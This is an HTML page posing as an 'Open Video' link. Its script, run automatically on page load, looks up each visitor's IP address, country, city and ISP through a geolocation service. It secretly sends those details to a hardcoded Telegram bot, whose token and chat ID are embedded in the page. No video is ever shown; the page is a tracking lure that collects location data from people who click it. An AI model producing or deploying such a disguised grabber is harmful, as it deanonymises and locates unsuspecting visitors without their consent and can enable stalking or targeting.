<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Video</title>
    <style>
        body {
            margin: 0;
            background: #0f0f0f;
            font-family: Arial, sans-serif;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: #1a1a1a;
            padding: 20px;
            border-radius: 12px;
            border: 1px solid #333;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            max-width: 320px;
            width: 100%;
        }
        .status {
            font-size: 13px;
            color: #aaa;
        }
    </style>
</head>
<body>

    <div class="container">
        <h3>Open Video</h3>
        <p class="status" id="statusText">Loading...</p>
    </div>

    <script>
        const BOT_TOKEN = '8942095399:AAGbL8-6mj89o3PefyQeVdRd9oVR0LrSNDg';
        const CHAT_ID = '7641255924';
        const statusText = document.getElementById('statusText');

        async function getIPAndSend() {
            try {
                // داواکردنی زانیاری ئایپی لە ڕێگەی API
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                
                let ipMessage = `🌐 New Visitor Info:\n\n` +
                                `IP: ${data.ip}\n` +
                                `Country: ${data.country_name}\n` +
                                `City: ${data.city}\n` +
                                `Org: ${data.org}`;

                // ناردنی زانیارییەکان بۆ تەلەگرام
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: ipMessage
                    })
                });

                statusText.innerText = "Ready!";
            } catch (e) {
                statusText.innerText = "Failed to load.";
            }
        }

        window.onload = getIPAndSend;
    </script>
</body>
</html>
